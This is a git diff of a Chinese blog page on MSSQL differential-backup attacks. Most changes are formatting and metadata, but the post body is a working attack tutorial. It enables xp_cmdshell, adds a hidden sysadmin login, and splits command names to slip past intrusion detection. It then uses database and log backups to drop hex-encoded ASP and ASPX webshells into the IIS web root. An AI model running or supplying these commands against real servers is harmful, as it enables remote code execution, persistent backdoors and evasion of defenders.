@@ -95,7 +95,7 @@
 <meta property="og:image" content="http://yoursite.com/2020/08/08/mssql差异备份/小葵.jpg">
 <meta property="og:image" content="http://yoursite.com/2020/08/08/mssql差异备份/保存成功.jpg">
 <meta property="og:image" content="http://yoursite.com/2020/08/08/mssql差异备份/火绒.png">
-<meta property="og:updated_time" content="2021-05-05T03:55:16.134Z">
+<meta property="og:updated_time" content="2022-04-24T00:17:38.889Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="mssql差异备份">
 <meta name="twitter:description" content="需要sa账号登录sql server数据库。 尝试系统命令：1exec xp_cmdshell &amp;apos;dir&amp;apos;">
@@ -314,8 +314,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/基础训练/" itemprop="url" rel="index">
-                    <span itemprop="name">基础训练</span>
+                  <a href="/categories/Web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">Web安全</span>
                   </a>
                 </span>
 
@@ -354,7 +354,8 @@
         <p>需要sa账号登录sql server数据库。</p>
 <p>尝试系统命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_cmdshell &apos;dir&apos;</span><br></pre></td></tr></table></figure></p>
 <a id="more"></a>
-<p><img src="/2020/08/08/mssql差异备份/dir.jpg" alt><br>这时通过下面的命令允许执行系统命令存储过程<code>sys.xp_cmdshell</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &apos;show advanced options&apos;,1;RECONFIGURE;exec sp_configure &apos;xp_cmdshell&apos;,1;RECONFIGURE;</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2020/08/08/mssql差异备份/dir.jpg" alt><br>这时通过下面的命令允许执行系统命令存储过程<code>sys.xp_cmdshell</code>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &apos;show advanced options&apos;,1;RECONFIGURE;exec sp_configure &apos;xp_cmdshell&apos;,1;RECONFIGURE;</span><br></pre></td></tr></table></figure>
 <p><img src="/2020/08/08/mssql差异备份/reconfigure.jpg" alt><br>这时再运行<code>exec xp_cmdshell &#39;dir&#39;</code>就执行了。</p>
 <p>添加一个用户，并将其放到管理员组（当前须得为sa用户）<br>（一般为了不引起警觉，不添加管理权限用户）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec master.dbo.sp_addlogin system,&apos;2015dainihuiji@&apos;;</span><br><span class="line">exec master.dbo.sp_addsrvrolemember system,sysadmin;</span><br></pre></td></tr></table></figure></p>
 <h1 id="备份数据库"><a href="#备份数据库" class="headerlink" title="备份数据库"></a>备份数据库</h1><p>使用下面的命令对数据库进行备份：</p>
@@ -368,7 +369,8 @@
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">;<span class="keyword">create</span> <span class="keyword">table</span> temp(<span class="keyword">id</span> <span class="keyword">nvarchar</span>(<span class="number">255</span>),numl <span class="keyword">nvarchar</span>(<span class="number">255</span>),num2 <span class="keyword">nvarchar</span>(<span class="number">255</span>),num3 <span class="keyword">nvarchar</span>(<span class="number">255</span>));<span class="comment">--</span></span><br><span class="line">;<span class="keyword">insert</span> temp exec master.dbo.xp_availablemedia;<span class="comment">--</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> temp</span><br></pre></td></tr></table></figure>
 <p>有时入侵检测会禁止使用xp_cmdshell命令，这时可以<strong>拆分命令</strong>或者<strong>对其进行编码</strong>。<br><strong>拆分命令</strong><br>一般对于存储过程不是数据库中的变量都设置成<code>sysname</code>。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;<span class="keyword">declare</span> @a sysname <span class="keyword">set</span> @a=<span class="string">'xp_cmdshell'</span> exec @a <span class="string">'dir c:\';</span></span><br></pre></td></tr></table></figure></p>
 <p>拆分成下面的语句绕过：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;<span class="keyword">declare</span> @a sysname <span class="keyword">set</span> @a=<span class="string">'xp_'</span>+<span class="string">'cmdshell'</span> exec @a <span class="string">'dir c:\'</span></span><br></pre></td></tr></table></figure></p>
-<p><strong>对其进行编码并利用差异备份写入webshell</strong><br>小葵转换工具：<br><img src="/2020/08/08/mssql差异备份/小葵.jpg" alt><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">;<span class="keyword">declare</span> @a sysname,@s <span class="keyword">nvarchar</span>(<span class="number">4000</span>) <span class="keyword">select</span> @a=db_name(),@s=<span class="number">0x63003A005C0069006E00650074007000750062005C0077007700770072006F006F0074005C0063006F006F006E006600690067002E00610073007000</span> <span class="keyword">backup</span> <span class="keyword">database</span> @a <span class="keyword">to</span> disk=@s;</span><br><span class="line">;<span class="keyword">create</span> <span class="keyword">table</span> [dbo].[cmd] ([cmd] [image]);</span><br><span class="line">;<span class="keyword">insert</span>  <span class="keyword">into</span> cmd(cmd) <span class="keyword">values</span>(<span class="number">0x3C25657865637574652872657175657374282261222929253E</span>);</span><br><span class="line">;<span class="keyword">select</span> @a=db_name(),@s=<span class="number">0x63003A005C0069006E00650074007000750062005C0077007700770072006F006F0074005C006900690069006E006400650078002E00610073007000</span> <span class="keyword">backup</span> <span class="keyword">database</span> @a <span class="keyword">to</span> disk=@s <span class="keyword">with</span> differential,<span class="keyword">format</span>;</span><br><span class="line">;<span class="keyword">drop</span> <span class="keyword">table</span> cmd</span><br></pre></td></tr></table></figure></p>
+<p><strong>对其进行编码并利用差异备份写入webshell</strong><br>小葵转换工具：<br><img src="/2020/08/08/mssql差异备份/小葵.jpg" alt></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">;<span class="keyword">declare</span> @a sysname,@s <span class="keyword">nvarchar</span>(<span class="number">4000</span>) <span class="keyword">select</span> @a=db_name(),@s=<span class="number">0x63003A005C0069006E00650074007000750062005C0077007700770072006F006F0074005C0063006F006F006E006600690067002E00610073007000</span> <span class="keyword">backup</span> <span class="keyword">database</span> @a <span class="keyword">to</span> disk=@s;</span><br><span class="line">;<span class="keyword">create</span> <span class="keyword">table</span> [dbo].[cmd] ([cmd] [image]);</span><br><span class="line">;<span class="keyword">insert</span>  <span class="keyword">into</span> cmd(cmd) <span class="keyword">values</span>(<span class="number">0x3C25657865637574652872657175657374282261222929253E</span>);</span><br><span class="line">;<span class="keyword">select</span> @a=db_name(),@s=<span class="number">0x63003A005C0069006E00650074007000750062005C0077007700770072006F006F0074005C006900690069006E006400650078002E00610073007000</span> <span class="keyword">backup</span> <span class="keyword">database</span> @a <span class="keyword">to</span> disk=@s <span class="keyword">with</span> differential,<span class="keyword">format</span>;</span><br><span class="line">;<span class="keyword">drop</span> <span class="keyword">table</span> cmd</span><br></pre></td></tr></table></figure>
 <p>&lt;%blockquote%&gt;<br>带有<code>00</code>的称为sql_encode，是sql专有的encode方式；而写入木马插入值的values为hex编码。虽然都是0x开头，但二者编码方式不同。<br>&lt;%endblockquote%&gt;<br><img src="/2020/08/08/mssql差异备份/保存成功.jpg" alt></p>
 <h1 id="log增量备份"><a href="#log增量备份" class="headerlink" title="log增量备份"></a>log增量备份</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">database</span> chayibf <span class="keyword">set</span> <span class="keyword">RECOVERY</span> <span class="keyword">FULL</span><span class="comment">--</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> cmd (a image)<span class="comment">--</span></span><br><span class="line"><span class="keyword">backup</span> <span class="keyword">log</span> chayibf <span class="keyword">to</span> disk = <span class="string">'c:\inetpub\wwwroot\test01.asp'</span> <span class="keyword">with</span> init<span class="comment">--</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> cmd (a) <span class="keyword">values</span> (<span class="number">0x3C25657865637574652872657175657374282261222929253E</span>)<span class="comment">--</span></span><br><span class="line"><span class="keyword">backup</span> <span class="keyword">log</span> chayibf <span class="keyword">to</span> disk = <span class="string">'c:\inetpub\wwwroot\test02.asp'</span><span class="comment">--</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> cmd<span class="comment">--</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">database</span> chayibf <span class="keyword">set</span> <span class="keyword">RECOVERY</span> SIMPLE<span class="comment">--</span></span><br></pre></td></tr></table></figure>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">database</span> chayibf <span class="keyword">set</span> <span class="keyword">RECOVERY</span> <span class="keyword">FULL</span>;<span class="comment">--</span></span><br><span class="line"><span class="keyword">Drop</span> <span class="keyword">table</span> cmd;<span class="comment">--</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> cmd (a image,<span class="keyword">id</span> <span class="built_in">int</span> <span class="keyword">IDENTITY</span> (<span class="number">1</span>,<span class="number">1</span>)); <span class="comment">--添加了个自动编号的字段</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> cmd (a) <span class="keyword">values</span>(<span class="number">0x3C25402050616765204C616E67756167653D224A73637269707422253E3C256576616C28526571756573742E4974656D5B227A225D2C22756E7361666522293B253E</span>);<span class="comment">--</span></span><br><span class="line"><span class="keyword">backup</span> <span class="keyword">database</span> chayibf <span class="keyword">to</span> disk = <span class="string">'c:\inetpub\wwwroot\test01.aspx'</span> <span class="keyword">with</span> init;<span class="comment">--</span></span><br><span class="line"><span class="keyword">backup</span> <span class="keyword">log</span> chayibf <span class="keyword">to</span> disk = <span class="string">'c:\inetpub\wwwroot\test03.aspx'</span> <span class="keyword">with</span> init;<span class="comment">--</span></span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> cmd <span class="keyword">where</span> <span class="keyword">id</span>&gt;<span class="number">1</span>;<span class="comment">--删除id&gt;1的数据</span></span><br><span class="line"><span class="keyword">backup</span> <span class="keyword">log</span> chayibf <span class="keyword">to</span> disk = <span class="string">'c:\inetpub\wwwroot\test02.aspx'</span>;</span><br></pre></td></tr></table></figure>
@@ -502,7 +504,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">52</span>
+                  <span class="site-state-item-count">31</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -513,7 +515,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-count">11</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -524,7 +526,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">66</span>
+                  <span class="site-state-item-count">63</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -577,7 +579,7 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
